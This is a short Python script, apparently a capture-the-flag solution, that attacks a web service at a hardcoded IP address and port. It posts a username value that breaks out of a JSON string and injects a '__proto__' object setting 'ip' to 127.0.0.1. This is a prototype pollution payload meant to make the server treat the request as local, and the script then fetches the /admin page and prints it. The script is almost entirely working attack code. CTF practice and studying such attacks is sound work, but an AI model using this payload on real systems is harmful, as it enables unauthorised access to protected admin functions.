#!/usr/bin/env python3
#-*- coding:utf-8 -*-
#__author__: 颖奇L'Amore www.gem-love.com

import json
import string
import requests as req
import sys

url = "http://121.37.165.126:30042/"

def pollution():
    s = req.session()
    # 先提交并污染
    res1 = s.post(url=url+"" ,data={"username":'","__proto__":{"ip":"127.0.0.1"},"":"'}, allow_redirects=False)
    res1 = s.get(url=url+"admin")
    res1 = s.get(url=url+"admin")
    return res1

def main():
    sess = pollution()
    print(sess.text)
if __name__ == '__main__':
	main()